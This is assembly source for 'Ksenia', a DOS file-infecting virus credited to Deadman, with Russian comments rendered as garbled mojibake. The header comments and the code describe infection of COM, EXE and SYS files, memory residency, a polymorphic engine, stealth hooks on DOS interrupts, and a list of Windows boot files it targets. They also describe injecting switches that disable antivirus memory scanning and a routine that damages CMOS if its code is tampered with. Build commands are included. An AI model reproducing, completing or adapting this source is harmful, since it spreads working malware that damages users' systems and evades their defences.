   ;  comment ê
   ;
   ;      Ksenia Final (C) Copyright by Deadman, Russia. E-Mail: dman@mail.ru
   ;     ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;  Ž¡é¨¥ á«®¢  ® ¢¨àãá¥
   ;   ‚¥áì ¨áå®¤¨ª ª®¬¬¥â¨à®¢  ¯® àãááª¨
   ;   ‚¨àãá  ¯¨á  â®«ìª® ¤«ï ¤¥¬®áâà æ¨®ëå æ¥«¥©. * ¡®â ¥â ¯®¤ ®¯¥à æ¨®®©
   ;   á¨áâ¥¬®© DOS ¢¥àá¨¨ 5.0-7.0 á ¯®¤¤¥à¦ª®© ¢á¥å „ˆ” (LFN) 16-¡¨âëå äãªæ¨©.
   ;   ‚¨àãá ¨ä¨æ¨àã¥â DOS ¯à¨«®¦¥¨ï COM/EXE/SYS â¨¯®¢. €¤ ¯â¨à®¢  ª à ¡®â¥ ¢
   ;   DOS ®ª¥ Win32. *à¨ ®á¥¤ ¨¨ ¢ ¯ ¬ïâ¨ § ¨¬ ¥â ¬« ¤è¨¥  ¤à¥á  ¯ ¬ïâ¨,   ¯à¨
   ;   ¨áâ ««ïæ¨¨ ¨§ SYS ¤à ©¢¥à  à §¬¥é ¥âáï ¯àï¬® ¢ DOS kernel (ï¤à¥), ª®¨¬
   ;   ï¢«ï¥âáï ¯¥à¢ë© ¡«®ª UMB ¨«¨ ®¡ëç®© ¯ ¬ïâ¨. ‡ à ¦¥¨¥ ä ©«®¢ ¯à®¨áå®¤¨â
   ;   ¯à¨ «î¡ëå ª ¨¬ ®¡à é¥¨ïå (¤ ¦¥ ¯à¨ DEL). *¥ «¨§®¢  ¬®éë© stealth ¬¥å -
   ;   ¨§¬, ª®â®àë© áªàë¢ ¥â á«¥¤ë ¯à¨áãâáâ¢¨ï ¢¨àãá  ¢ ¬ è¨¥. *à¨ à ¡®â¥ ¥ª®-
   ;   â®àëå ¯à®£à ¬¬ ( àå¨¢ â®à®¢ ¨«¨ ª ª¨å-¨¡ã¤ì ¤®ªâ®à®¢) stealth äãªæ¨¨
   ;   ¢à¥¬¥® ®âª«îç îâáï. *à¨ § à ¦¥¨¨ ä ©«®¢ ¢¨àãá ¢ë§ë¢ ¥â ¢ãâà¥îî
   ;   polymorphic engine, ª®â®à ï ¯®¬¨¬® ªãç¨ ¬ãá®à  £¥¥à¨â àï¤ ¤¥áªà¨¯â®àëå
   ;   ¨áâàãªæ¨©, ¨á¯®«ì§ãîé¨å á«ãç ©ë¥ à¥£¨áâàë. ’ ª¦¥ ¢¨àãá ¨¬¥¥â ªãá®ª ª®¤ ,
   ;   ª®â®àë©   «¨§¨àã¥â, ¨ªâ® «¨  á ¥ ¯®¤ í¢à¨áâ¨ª®¬ ¥ § ¯ãáª ¥â, ¨ ¯¥à¥-
   ;   ¤ ¥â ã¯à ¢«¥¨¥ ¢â®à®¬ã, ¢ãâà¥ã¬ã ¤¥áªà¨¯â®à®¬ã ª®¤ã, ª®â®àë© ã¦¥ ¨
   ;   à áè¨äà®¢ë¢ ¥â ¢¨àãá ®ª®ç â¥«ì®. *¥à¥¤ ®á¥¤ ¨¥¬ ¢¨àãá  ¢ ¯ ¬ïâ¨ ®
   ;   ¯ëâ ¥âáï ¯à®¨ä¨æ¨à®¢ âì ¥ª®â®àë¥ ¦¨§¥® ¢ ¦ë¥ ¯à®£à ¬¬ë, ª®â®àë¥
   ;   ãç áâ¢ãîâ ¢ § £àã§ª¥ ª®¬¯ .
   ;   ˆ¬¥¥â à¥§¨¤¥âãî ¯à®æ¥¤ãàã, ¢¥è îéãîáï   â ©¬¥à ¨ ¡«®ª¨àãîéãî ã¤ «¥¨¥
   ;   ¢¨àãá®£® ®¡à ¡®âç¨ª  DOS ¯à¥àë¢ ¨ï ¨§ ®¡é¥© æ¥¯®çª¨. ’ ª¦¥ ¯à¨ ¯®¯ëâª¥
   ;   ¬®¤¨ä¨æ¨à®¢ ¨ï ª®¤  ¢¨àãá  ¢ ¯ ¬ïâ¨ (¢ á«ãç ¥, ¥á«¨ CRC32 ¨§¬¥¨« áì), ®
   ;   ¯®¢¥á¨â ¬ è¨ã (¤ ¦¥ ¯®¤ MD), ® ¯¥à¥¤ íâ¨¬ § ¯¨è¥â ¢ ŠŒŽ* (CMOS) ªãçã
   ;   ¨ª®¬ã ¥ ã¦®£® ¬ãá®à . *à¨ ®âªàëâ¨¨ DOS ®ª  ¢¨àãá ¯®¢â®à® ¯¥à¥å¢ âë-
   ;   ¢ ¥â ¯à¥àë¢ ¨¥ DOS ¤«ï â®£®, çâ®¡ë ¨ ¢¯à¥¤ì ¡ëâì  ªâ¨¢ë¬ ¢ ¯ ¬ïâ¨ (  â®
   ;   ¢¨¤  ¢á¥ á¤¥« ¥â ¢ ¯à®â¬®¤¥ ¨ ¢¨àãá ã¯à ¢«¥¨ï ¥ ¯®«ãç¨â). ‚¨àãá ¬®¨â®-
   ;   à¨â § ¯ãáª ¯à®£à ¬¬ ¨ ¯à¨ § ¯ãáª¥ ¥ª®â®àëå  â¨¢¨àãá®¢ ¤®¡ ¢«ï¥â ¢ ¨å ª®-
   ;   ¬ ¤ãî áâà®ªã ¯ à ¬¥âàë ¤«ï ®âª«îç¥¨ï â¥áâ¨à®¢ ¨ï ¯ ¬ïâ¨ (áª®à®  ¢¥àë
   ;   ¤®¡ ¢ïâ ¢ á¢®¨ âï¦¥«ë¥ ¡ §ë ¨ íâã á¨£ âãàã). *®ª  ¨ªâ® ¨§ [AVP/FP/DRWEB]
   ;   ¨ç¥£® ¯à® § à ¦¥ë¥ ä ©«ë ªà®¬¥ "- Ok" â ª ¨ ¥ á¬®£ áª § âì. *à¨ § à ¦¥-
   ;   ¨¨ ä ©«®¢ ¢¨àãá áà ¢¨¢ ¥â ¢à¥¬ï á®§¤ ¨ï íâ®£® ä ©«  ¨ â¥ªãé¥¥ ¢à¥¬ï, ¨
   ;   ¥á«¨ ¥ ¤ © ¡®£ ¯®«¥ ç á®¢ á®¢¯ ¤¥â, ¢¨àãá § ªà®¥â ä ©« ¨ ¯¥à¥¤ áâ ã¯à ¢-
   ;   «¥¥¥ á«¥¤ãîé¥¬ã ®¡à ¡®âç¨ªã ¯à¥àë¢ ¨ï. ‚¨àãá ¨¬¥¥â ¢á¥ ª« áá¨ç¥çª¨¥ ä¨ç¨,
   ;   á®åà ï¥â ¤ âã/¢à¥¬ï, á¡à áë¢ ¥â/á®åà ï¥â  ââà¨¡ãâë ä ©«  ¨ ¯¥à¥å¢ âë¢ ¥â
   ;   ¯à¥àë¢ ¨¥ ªà¨â¨ç¥áª®© ®è¨¡ª¨ Int 24h á ª®¤®¬ ¢®§¢à â  03 (Fail). *  ¢à¥¬ï
   ;   ¨áâ ««ïæ¨¨ ¢¨àãá  ¢á¥ à¥£¨áâàë ¯à®æ¥áá®à  8086 á®åà ïîâáï ¢ áâ¥ª¥ ¨ ¯à¨
   ;   ¯¥à¥¤ ç¥ ã¯à ¢«¥¨ï ¢®ááâ  ¢«¨¢ îâáï ®ââã¤ . *¥ ¨¬¥¥â ¢áïª®© « ¦¨ â¨¯ 
   ;    â¨-âà áá¨à®¢ª  ¨  â¨-¤¨§ á¬, ¯®â®¬ã çâ® ¢á¥ íâ® ®â¨¬¥â ã ¬¥ï ¨ ã ¤àã-
   ;   £®£® â®«ìª® ¢à¥¬ï ¨ ¨ ¢ ª®¥¬ á«ãç ¥ ¥ ¯à¨¥á¥â âà¥¡ã¥¬®£® à¥§ã«ìâ â 
   ;   (¨¬¥ï ¢ ª®««¥ªæ¨¨ ¡®«¥¥ 200 íâ¨å ¯à¨¥¬®¢ ¥é¥ ¨   ®¤®¬ ï ¥ ¯®¯ «áï).
   ;   *¥ § à ¦ ¥â ¥ª®â®àë¥ § à¥£¨áâà¨à®¢ ë¥ â¨¯ë ä ©«®¢ (â¨¯  COMMAND ¨ ADINF)
   ;
   ;  „¥â «¨:
   ;   ‘¯¨á®ª ¯¥à¥å¢ âë¢ ¥¬ëå äãªæ¨© ¯à¥àë¢ ¨ï 21h ¤«ï § à ¦¥¨ï ä ©«®¢:
   ;    3Dh/1857h/41h/43h/4Bh/56h/6C00h/7141h/7143h/7156h/716Ch/71A9h
   ;     (Open/Internal/Unlink/CHMOD/Exec/Ren/ExtOpen/LFNs/../ServerOpen)
   ;
   ;   ‘¯¨á®ª ¯¥à¥å¢ âë¢ ¥¬ëå äãªæ¨© ¯à¥àë¢ ¨ï 21h ¤«ï à¥ «¨§ æ¨¨ stealth:
   ;    11h/12h/4Eh/4Fh/714Eh/714Fh/71A6h/57h/42h/3Fh/40h
   ;     (FCB/DTA/LFN Find/GetHandleInfo/FileTimeDate/Seek/Read/Write)
   ;
   ;   ‘¯¨á®ª ¯¥à¥å¢ âë¢ ¥¬ëå äãªæ¨© ¯à¥àë¢ ¨ï 21h ¤«ï à¥ «¨§ æ¨¨ SFT stealth:
   ;    3Dh/6C00h/716Ch/71A9h+¢á¥ äãªæ¨¨ ¤«ï à ¡®âë á ¤¥áªà¨¯â®à®¬ ä ©« 
   ;
   ;   ˆ ¥ª®â®àë¥ á«ã¦¥¡ë¥ äãªæ¨¨:
   ;    1856h/4Ah
   ;     (Residency check/à¥-¯¥à¥å¢ â Int 21h)
   ;
   ;   ‡ à ¦¥¨¥ ä ©«®¢ ¯à¨ ¨áâ ««ïæ¨¨ ¢ ¯ ¬ïâì:
   ;    %WINBOOTDIR%\SYSTEM\CONAGENT.EXE
   ;    %WINBOOTDIR%\COMMAND\MODE.COM
   ;    %WINBOOTDIR%\COMMAND\ANSI.SYS
   ;    %WINBOOTDIR%\HIMEM.SYS
   ;    %WINBOOTDIR%\WIN.COM
   ;
   ;   Žâª«îç¥¨¥ stealth:
   ;    PKZIP/RAR/ARJ/LHA/ARC/UUENCODE/DEFRAG/SPEEDISK/SCANDISK/CHKDSK/NDD/ADINF
   ;
   ;   ˆ£®à¨à®¢ ¨¥ ä ©«®¢ ¯à¨ § à ¦¥¨¨:
   ;    COMMAND/ADINF
   ;
   ;   „®¡ ¢«¥¨¥ ¯ à ¬¥âà®¢ ¢ ª®¬ ¤ãî áâà®ªã
   ;    AVPDOS32 /M
   ;    DRWEB    /NM
   ;    F-PROT   /NOMEM
   ;
   ;   ‚¨àãá ¨¬¥¥â ¤«¨ã à®¢® 5000 ¡ ©â ¨ ¯®íâ®¬ã § ¯ãáª âì ¥£® ªà ©¥
   ;   ¥¦¥« â¥«ì®. *ã,   ®âª®¬¯¨«¨à®¢ âì ¢ COM ä ©« ¬®¦®:
   ;   tasm ksenia.asm /m3
   ;   tlink ksenia.obj /x/t
   ;
   ;   *  íâ®¬ ¢á¥, ¯®ª .
   ;
   ;  ê

    vsize  equ     eov-ksenia      ; ¤¨áª®¢ ï ¯ ¬ïâì ¤«ï ¢¨àãá 
    msize  equ     eom-ksenia      ; à §¬¥à ¯ ¬ïâ¨ âà¥¡ã¥¬®© ¢¨àãáã
    v_id   equ     0b52dh          ; ¬¥âª  ¢¨àãá  (HEADER+12h)

    b      equ     <byte ptr>      ; ¥ª®â®àë¥ á®ªà é¥¨ï
    w      equ     <word ptr>
    d      equ     <dword ptr>
    o      equ     <offset>

    mvs    macro   Dest,Sour       ; ¬ ªà®á ¤«ï ¯¥à¥áë«ª¨ ¤ ëå
           push    Sour            ; ç¥à¥§ áâ¥ª
           pop     Dest
           endm

           model   tiny            ; ˜€*Š€
           codeseg
           p386
           org     100h
    ksenia:
           xor     bp,bp           ; ã¦® ¤«ï 1-£® § ¯ãáª  ¢¨àãá 
           call    crc             ; ¯®¤áç¥â CRC ¢¨àãá 
           mov     checksum,eax
           call    SaveRegs        ; á®åà ¥¨¥ ¢å®¤ëå à¥£¨áâà®¢
           jmp     shield          ; íâ¨ CRLEN ¡ ©â § à¥§¥à¢¨à®¢ ë ¢ â¥«¥
           org     ksenia+crlen    ; ¢¨àãá  ¤«ï ¯®«¨¬®àä®£® ¤¥è¨äà â®à 

           push    3202h           ; ¢®ááâ ®¢«¥¨¥ ä« £®¢
           popf
           call    SaveRegs        ; á®åà ¥¨¥ ¢å®¤ëå à¥£¨áâà®¢

           mov     ah,30h          ; § ¯à®á ¢¥àá¨¨ DOS
           int     21h             ; ¯à¨¬¥ï¥âáï ¤«ï ¢ëç¨á«¥¨ï
    ip:    mov     bp,sp           ; íªáâà  á¬¥é¥¨ï ¢ § à ¦¥®¬ ä ©«¥
           mov     bp,[bp-6]       ; á®åà ¥®¥ IP ª®¬ ¤®© INT ¨
           sub     bp,offset ip    ; ¢ëç¨á«ï¥¬ à §®áâì á¬¥é¥¨© (delta)

           push    ds              ; íâ®â ªãá®ª ª®¤  ¥ ¤ áâ í¬ã«ïâ®àã
           mvs     ds,0ffffh       ; à áè¨äà®¢ âì ¢¨àãá
           mov     si,07h          ; FFFF:0005 á®¤¥à¦¨â ¤ âã, ¨§ ª®â®à®© ¬ë
           mov     dx,2eh          ; å¢ â ¥¬ á¨¬¢®« "/", ¨ á ¯®¬®éìî XOR
           xor     dl,[si]         ; ¯®«ãç ¥¬ ¥¤¨¨æã
           pop     ds

           lea     si,endi-1+bp    ; ¢â®à®¥ (¢ãâà¥¥¥) ª®«ìæ® § é¨âë ¢¨àãá 
           mov     cx,endi-shield-1
    turbo: mov     al,cs:[si]      ; ªà âª ï áâàãªâãà :
           add     cs:[si-1],al    ; „Ž:    byte1 byte2 byte3 byte4
           sub     si,dx           ; *Ž‘‹…: b1+b2 b2+b3 b3+b4 b4+b5
           loop    turbo
    shield:
           cmp     cs:host+bp,"S"  ; ¯à®¢¥àª  å®áâ    á¨áâ¥¬ë©
           jz      strategy        ; ¤à ©¢¥à

           mov     ax,1856h        ; ¯à®¢¥àª    ¯à¨áãâáâ¢¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨
           int     21h             ; AH=18 - ¯ãáâ ï äãªæ¨ï
           cmp     ax,3265h        ; AX=3265 - § ç¨â, çâ® ª®¯¨ï ¢¨àãá  ã¦¥ ¢
           jne     exeinstall      ; ¯ ¬ïâ¨

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ‚®§¢à é¥¨¥ ã¯à ¢«¥¨ï ¯à®£à ¬¬¥
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    complete:
           lea     si,original+bp  ; si-á®åà ¥®¥  ç «® å®áâ 
           mov     al,cs:host+bp   ; § £àã§ª  ª®¤  â¨¯  å®áâ 
           cmp     al,"S"          ; á¨áâ¥¬ë© ¤à ©¢¥à?
           jz      run_sys
           cmp     al,"E"          ; ¨á¯®«ï¥¬ë© ä ©«?
           jz      run_exe

           mov     di,100h         ; â¨¯ § à ¦¥®© ¯à®£à ¬¬ë: COM
           push    di              ; á®åà ¥¨¥ ¢ áâ¥ª¥  ¤à¥á  ¢®§¢à â 
           mov     cx,32           ; ¢®ááâ ®¢«¥¨¥ ¢ ¯ ¬ïâ¨ ®à¨£¨ «ì®£®
           rep     movsb           ; § £®«®¢ª  ¯à®£à ¬¬ë
           jmp     LoadRegs        ; ¯¥à¥¤ ç  ã¯à ¢«¥¨ï ¢  ç «® ¯à®£à ¬¬ë

    run_sys:
           mov     ax,cs:[si+12h]  ; ¢®ááâ ®¢«¥¨¥ ¬¥âª¨ ¢¨àãá 
           mov     cs:[12h],ax     ; ¢®ááâ ®¢«¥¨¥ á¬¥é¥¨ï ¯à®æ¥¤ãàë
           mov     ax,cs:[si+06h]  ; ®¡à ¡®âª¨ áâà â¥£¨¨
           mov     cs:[06h],ax     ;
           push    ax              ; á®åà ¥¨¥ á¬¥é¥¨ï ¢ áâ¥ª¥
           jmp     LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢

    run_exe:
           mov     ax,es
           add     ax,010h
           add     cs:[si+16h],ax  ; .reloc
           add     cs:[si+0eh],ax  ; .reloc
           mov     bp,sp
           mov     [bp.rbx],si     ; á®åà ¥¨¥ ãª § â¥«ï   § £®«®¢®ª
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           mov     ss,cs:[bx+0eh]  ; ãáâ ®¢ª  áâ¥ª®¢®£® á¥£¬¥â 
           mov     sp,cs:[bx+10h]  ; ãáâ ®¢ª  ãª § â¥«ï áâ¥ª 
           jmp     d cs:[bx+14h]   ; ¯¥à¥¤ ç  ã¯à ¢«¥¨ï

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ˆáâ ««ïæ¨ï ¢¨àãá  ¢ ¯ ¬ïâì ¨§ ª®¬ ¤®£® ä ©« 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    exeinstall:
           mov     di,100h         ; ES:DI = PSP:0100
           mvs     ds,cs           ; DS:SI = ª®¤ ¢¨àãá 
           lea     si,ksenia+bp    ; ª®¯¨àã¥¬ ª®¤ ¢¨àãá  ¯®¢¥àå § à ¦¥®©
           mov     cx,msize        ; ¯à®£à ¬¬ë áà §ã ¯®á«¥ PSP
           db      6ah,00h         ; § £àã¦ ¥¬ ¢ áâ¥ª ª®¬ ¤ë ¤«ï
           db      66h,68h         ; ª®¯¨à®¢ ¨ï ¢¨àãá 
           db      0f3h,0a4h,0cah,6
           push    es offset done  ; rep movsb / retn 06
           mov     ax,sp
           add     ax,4
           jmp     far ptr ax

    done:  mov     ax,cs           ; ¬ë   ®¢®¬ ¬¥áâ¥, á ¯à ¢¨«ìë¬
           mov     ds,ax           ; á¬¥é¥¨¥¬, ª ª ¯à¨ ª®¬¯¨«ïæ¨¨
           mov     seg0,ax         ; § ¯®«¥¨¥ á¥£¬¥âëå ¯®«¥© ¢ EPB
           mov     seg1,ax
           mov     seg2,ax

           call    VectMan         ; § £àã§ª  ¨ ¯¥à¥å¢ â ¢¥ªâ®à®¢ ¯à¥àë¢ ¨©
           call    FixVirus        ; § à ¦¥¨¥ ¥ª®â®àëå ¢ ¦ëå ä ©«®¢

           mov     ah,4ah          ; ã¬¥ìè¨âì ¤® ã¦®£® à §¬¥à  ¡«®ª
           mov     bx,(msize+100h)/16+2 ; ¯ ¬ïâ¨, ¢ë¤¥«¥ë© ¯à®£à ¬¬¥
           mvs     es,cs
           int     21h

           mov     si,2ch          ; PSP:2Ch = á¥£¬¥â ®ªàã¦¥¨ï
           mov     ds,[si]         ; ¯®¬¥áâ¨âì ¥£® ¢ DS
           xor     ax,ax
           mov     si,-1

    escan: inc     si              ; áª ¨¬ ¯®ª  ¥  ©¤¥¬ DW 0
           cmp     W [si],ax       ; §  ¨¬ á«¥¤ã¥â ¨¬ï ä ©«  (¯à®£à ¬¬ë),
           jne     escan           ; ¨§ ª®â®à®© ¡ë« § ¯ãè¥ ¢¨àãá
           lea     dx,[si+4]       ; dx -> ¨¬ï

           mov     ax,cs           ; ¯à®¨¨æ¨ «¨§¨àã¥¬ áâ¥ª®¢ë¥ ãª § â¥«¨
           mov     ss,ax           ;   â® ®¨ ¡®«â îâáï £¤¥-â® ¢¨§ã //
           lea     sp,stacks+size stacks

           mov     ax,4b00h        ; § ¯ãáª ¥¬ ®á¨â¥«ï
           lea     bx,epb          ; ES:BX = EPB
           int     21h

           mov     si,2ch
           mov     es,cs:[si]      ; ¯®«ãç¥¨¥ á¥£¬¥â  ®ªàã¦¥¨ï
           mov     ah,49h          ; ®á¢®¡®¦¤¥¨¥ ¡«®ª  ¯ ¬ïâ¨
           int     21h

           mov     ax,cs           ; ¬ áª¨àã¥¬  è ¡«®ª ¯ ¬ïâ¨ â ª, ª ª ¡ã¤â®
           dec     ax              ; ® á®¤¥à¦¨â â®«ìª®  è PSP. € ¯®¤ á¥¡ï
           mov     ds,ax           ; ¯®áâà®¨¬ ¤àã£®© ¡«®ª ¯ ¬ïâ¨, á«¥¤ãîé¨©
           xor     si,si           ; ¯àï¬® §  PSP. *à¨ § ¢¥àè¥¨¨ ¯à®£à ¬¬ë
           mov     al,4dh          ;  è ¡«®ª ¯ ¬ïâ¨ ¥ ¡ã¤¥â ®á¢®¡®¦¥.
           xchg    B [si],al
           mov     W [si+3],0fh    ; * ¬ïâì ¯®¤ MCB  ¬ «î¡¥§® ¯à¥¤®áâ ¢«¥ 
           mov     B [si+100h],al  ; ª®¬ ¤®© áâà®ª®© (PSP+0F0h)
           mov     W [si+101h],8   ;
           mov     W [si+103h],msize/16+2

           mov     ah,4dh          ; AH=4Dh (WAIT)
           int     21h             ; ¯®«ãç¨âì ErrorLevel § ¯ãé¥®© ¯à®£à ¬¬ë
           mov     ah,4ch          ; AH=4Ch (EXIT)
           int     21h             ; ¢ë©â¨ ¢ DOS ¡¥§ ¢áïª¨å ¯®¤®§à¥¨©

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ˆáâ ««ïæ¨ï ¢¨àãá  ¢ ¯ ¬ïâì ¨§ .SYS ä ©« 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Strategy:
           mvs     ds,cs           ; ¨¨æ¨ «¨§ æ¨ï á¥£¬¥â®£® à¥£¨áâà 
           mov     si,sp           ; § £àã§ª  ãª § â¥«¥©   ¡«®ª
           mov     bx,ss:[si.rbx]  ; § ¯à®á  ¨§ áâ¥ª 
           mov     es,ss:[si.res]  ;
           lea     si,reqhdr+bp
           mov     [si],bx         ; á®åà ¥¨¥ ãª § â¥«¥© ¢ ïç¥©ª å
           mov     [si+2],es       ; ¯ ¬ïâ¨ ¢ â¥«¥ ¢¨àãá 
           jmp     complete        ; ¯¥à¥¤ ç  ã¯à ¢«¥¨ï ¤à ©¢¥àã

    Interrupt:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢

           mov     ah,30h          ; § ¯à®á ¢¥àá¨¨ DOS
           int     21h             ; ¯à¨¬¥ï¥âáï ¤«ï ¢ëç¨á«¥¨ï
    ipX:   mov     bp,sp           ; íªáâà  á¬¥é¥¨ï ¢ § à ¦¥®¬ ä ©«¥
           mov     bp,[bp-6]       ; á®åà ¥®¥ IP ª®¬ ¤®© INT ¨
           sub     bp,offset ipX   ; ¢ëç¨á«ï¥¬ à §®áâì á¬¥é¥¨© (delta)

           mvs     ds,cs           ; ¨¨æ¨ «¨§ æ¨ï DS
           lea     si,original+bp  ; ãª § â¥«ì   ®à¨£¨ «ì®¥
           lea     di,intcall+bp   ;  ç «® ¤à ©¢¥à 
           mov     ax,[si+08]      ; § £àã§ª  á¬¥é¥¨ï ¯à®æ¥¤ãàë
           mov     ds:[08],ax      ; ¯à¥àë¢ ¨ï á®åà ¥¨¥ á¬¥é¥¨ï
           mov     [di],ax         ; ïç¥©ª  á  ¤à¥á®¬ ¯à®æ¥¤ãàë ¯à¥àë¢ ¨ï
           mov     [di+02],cs      ; ¤à ©¢¥à 

           lea     bx,reqhdr+bp    ; ãª § â¥«ï    ¤à¥á § £®«®¢ª  § ¯à®á 
           les     bx,[bx]         ; § £àã§ª   ¤à¥á  § £®«®¢ª  § ¯à®á 
           mov     ax,es:[bx.0eh]  ; á¬¥é¥¨¥ ª®æ  ¯ ¬ïâ¨, ¤®áâã¯®© ¤à ©¢¥àã
           shr     ax,4            ; ¯®«ãç¥¨¥ á¥£¬¥â®© á®áâ®¢«ïîé¥© á¬¥é¥¨ï
           add     ax,es:[bx.10h]  ; ¤®¡ ¢«¥¨¥ á¥£¬¥â  ª®æ  ¯ ¬ïâ¨
           sub     ax,msize/10h+2  ; ã¬¥ìè¥¨¥ ¤®áâã¯®© ¤à ©¢¥àã ¯ ¬ïâ¨
           mov     w es:[bx.0eh],0 ; á¬¥é¥¨¥ ¯®á«¥¤¥£® ¤®áâã¯®£® ¡ ©â 
           mov     es:[bx.10h],ax  ; á¥£¬¥â ¯®á«¥¤¥£® ¤®áâã¯®£® ¡ ©â 
           sub     ax,10h          ; AX - á¥£¬¥â ¢¨àãá 
           mov     es,ax           ; á®åà ¥¨¥ á¥£¬¥â 
           mov     di,100h         ; ¯¥à¥£® ¢¨àãá  ¢ ªãá®ª
           lea     si,[di+bp]      ; ®âªãè¥®© ã ¤à ©¢¥à  ¯ ¬ïâ¨
           mov     cx,msize
           cld
           rep     movsb

           push    es o tmps       ; ¯¥à¥¤ ç  ã¯à ¢«¥¨ï ¢ ®¢ë© á¥£¬¥â
           retf
    tmps:  call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢

           call    d cs:intcall    ; ¢ë§®¢ ¤à ©¢¥à  (äãªæ¨ï 00: ¨¨æ¨ «¨§ æ¨ï)

           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     ax,1856h        ; ¯à®¢¥àª    ¯à¨áãâáâ¢¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨
           int     21h             ; AH=18 - ¯ãáâ ï äãªæ¨ï
           cmp     ax,3265h        ; AX=3265 - § ç¨â, çâ® ª®¯¨ï ¢¨àãá  ã¦¥ ¢
           jz      sfars           ; ¯ ¬ïâ¨

           mvs     ds,cs           ; ¨¨æ¨ «¨§ æ¨ï á¥£¬¥â®£® à¥£¨áâà 
           les     bx,d reqhdr     ; ¡ãä¥à § ¯à®á 
           mov     ax,es:[bx.0eh]  ; á¬¥é¥¨¥ ª®æ  ¯ ¬ïâ¨, ¤®áâã¯®© ¤à ©¢¥àã
           shr     ax,4            ; ¯®«ãç¥¨¥ á¥£¬¥â®© á®áâ®¢«ïîé¥© á¬¥é¥¨ï
           add     ax,es:[bx.10h]  ; ¤®¡ ¢«¥¨¥ á¥£¬¥â  ª®æ  ¯ ¬ïâ¨
           cmp     ax,intcall+2    ; á¥£¬¥â ¤à ©¢¥à 
           jz      sfars           ; ¥à¥§¨¤¥âë© ¤à ©¢¥à?

           inc     ax              ; + 1 ¯ à £à ä
           push    ax              ; £à ¨æ 
           add     ax,msize/10h+2  ; ã¢¥«¨ç¥¨¥ £à ¨æ ¯ ¬ïâ¨
           mov     w es:[bx.0eh],0 ; á¬¥é¥¨¥ ¯®á«¥¤¥£® ¤®áâã¯®£® ¡ ©â 
           mov     es:[bx.10h],ax  ; á¥£¬¥â ¯®á«¥¤¥£® ¤®áâã¯®£® ¡ ©â 
           pop     ax              ; ã¦¥ ¥ £à ¨æ 

           sub     ax,10h          ; AX - á¥£¬¥â ¢¨àãá 
           mov     es,ax           ; á®åà ¥¨¥ á¥£¬¥â 
           mov     di,100h
           mov     si,di
           mov     cx,msize        ; ª®¯¨à®¢ ¨¥ â¥«  ¢¨àãá  ¨§
           cld                     ; ¢à¥¬¥®£® á¥£¬¥â  ¢ ®ª®ç â¥«ìë©
           rep     movsb

           push    es offset owns  ; ¯¥à¥¤ ç  ã¯à ¢«¥¨ï ¢ ®ª®ç â¥«ìë©
           retf                    ; á¥£¬¥â ¢¨àãá  ¯®á«¥ ¤à ©¢¥à 
    owns:  call    VectMan         ; § £àã§ª  ¨ ¯¥à¥å¢ â ¢¥ªâ®à®¢ ¯à¥àë¢ ¨©

    sfars: call    LoadRegs        ; § £àã§ª  à¥£¨áâà®¢
           retf

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Ž¡« áâì ¤ ëå
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

    copyright    db      'Ksenia.'
                 db      vsize/1000 mod 10+'0'
                 db      vsize/100  mod 10+'0'
                 db      vsize/10   mod 10+'0'
                 db      vsize      mod 10+'0'
                 db      ' Final Version Copyright (C) ',??date,' by Deadman',0

    extens       db      '.com',0  ; à áè¨à¥¨ï ä ©«®¢, ª®â®àë¥ ¬ë
                 db      '.exe',0  ; ¨ä¨æ¨àã¥¬
                 db      '.sys',0
                 db      0

    prms         db      'AVPDOS32',0,0,' /M'    ,0dh
                 db      'DRWEB'   ,0,0,' /NM'   ,0dh
                 db      'F-PROT'  ,0,0,' /NOMEM',0dh
                 db      0

    AVs          db      'ADINF',0   ; ¨å ¢¨àãá âà®£ âì ¥ ¡ã¤¥â
                 db      'COMMAND',0
                 db      0

    windows      db      'WiNBooTDiR=',0
                 db      0

    files        db      '\SYSTEM\CONAGENT.EXE',0
                 db      '\COMMAND\MODE.COM',0
                 db      '\COMMAND\ANSI.SYS',0
                 db      '\HIMEM.SYS',0
                 db      '\WIN.COM',0
                 db      0

    stlock       db      'PKZIP',0 ; ¯à®£à ¬¬ë, ¢® ¢à¥¬ï à ¡®âë ª®â®àëå
                 db      'RAR',0   ; ®âª«îç îâáï áâ¥«á-äãªæ¨¨ ¢¨àãá 
                 db      'ARJ',0
                 db      'LHA',0
                 db      'ARC',0
                 db      'UUENCODE',0
                 db      'DEFRAG',0
                 db      'SPEEDISK',0
                 db      'SCANDISK',0
                 db      'CHKDSK',0
                 db      'NDD',0
                 db      'ADINF',0
                 db      0

